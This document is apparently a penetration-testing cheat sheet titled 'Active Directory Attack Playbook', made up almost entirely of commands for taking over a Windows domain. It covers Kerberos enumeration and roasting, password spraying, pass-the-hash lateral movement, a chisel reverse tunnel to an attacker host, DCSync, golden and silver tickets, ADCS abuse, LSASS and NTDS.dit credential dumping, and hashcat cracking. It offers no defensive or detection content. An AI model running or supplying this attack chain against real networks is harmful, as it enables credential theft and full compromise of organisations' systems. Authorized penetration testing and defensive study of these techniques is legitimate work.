# Active Directory Attack Playbook

Step-by-step guide from initial foothold to domain admin.

## Stage 1: Unauthenticated Enumeration

```bash
# Null session check
rpcclient -U '' -N <dc_ip>
crackmapexec smb <dc_ip> -u '' -p ''

# LDAP anonymous bind
ldapsearch -x -H ldap://<dc_ip> -s base

# User enumeration via Kerberos (no creds needed)
kerbrute userenum -d domain.local --dc <dc_ip> users.txt

# AS-REP Roasting (no creds needed)
impacket-GetNPUsers domain.local/ -dc-ip <dc_ip> -usersfile users.txt -no-pass
```

## Stage 2: With Domain User Credentials

```bash
# BloodHound collection
bloodhound-python -u 'user' -p 'pass' -d domain.local -c all -ns <dc_ip>

# Kerberoasting
impacket-GetUserSPNs domain.local/user:pass -dc-ip <dc_ip> -request

# Enumerate shares
crackmapexec smb <dc_ip> -u user -p pass --shares

# Enumerate users and groups
crackmapexec smb <dc_ip> -u user -p pass --users
crackmapexec smb <dc_ip> -u user -p pass --groups

# Password spray (careful with lockout policy)
crackmapexec smb <dc_ip> -u users.txt -p 'Spring2026!' --no-bruteforce

# Find delegation
impacket-findDelegation domain.local/user:pass -dc-ip <dc_ip>
```

## Stage 3: Lateral Movement

```bash
# Pass-the-Hash
crackmapexec smb <target> -u admin -H '<ntlm_hash>'
impacket-psexec domain.local/admin@<target> -hashes :<ntlm_hash>
evil-winrm -i <target> -u admin -H '<ntlm_hash>'

# WMI Execution
impacket-wmiexec domain.local/admin:pass@<target>

# RDP with hash (Restricted Admin mode)
xfreerdp /v:<target> /u:admin /pth:<ntlm_hash> /cert:ignore

# Pivoting with chisel
# Attacker: chisel server --reverse -p 8080
# Target: chisel client <attacker>:8080 R:socks
```

## Stage 4: Domain Privilege Escalation

```bash
# DCSync (need Replicating Directory Changes)
impacket-secretsdump domain.local/admin:pass@<dc_ip>

# Golden Ticket
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <sid> -domain domain.local admin

# Silver Ticket
impacket-ticketer -nthash <service_hash> -domain-sid <sid> -domain domain.local -spn CIFS/<target> admin

# GPP Passwords (Group Policy Preferences)
crackmapexec smb <dc_ip> -u user -p pass -M gpp_password

# ADCS (Certificate Services) abuse
certipy find -u user@domain.local -p pass -dc-ip <dc_ip>
certipy req -u user@domain.local -p pass -ca CA-NAME -template VulnTemplate
```

## Stage 5: Credential Extraction

```bash
# LSASS dump (on target)
mimikatz# sekurlsa::logonpasswords

# SAM/SYSTEM dump
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# NTDS.dit extraction
impacket-secretsdump domain.local/admin:pass@<dc_ip> -just-dc

# VSS Shadow Copy method
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
```

## Hash Cracking Reference

```bash
# NTLM
hashcat -m 1000 hashes.txt wordlist.txt

# NTLMv2
hashcat -m 5600 hashes.txt wordlist.txt

# Kerberoast (TGS-REP)
hashcat -m 13100 tgs_hashes.txt wordlist.txt

# AS-REP Roast
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```
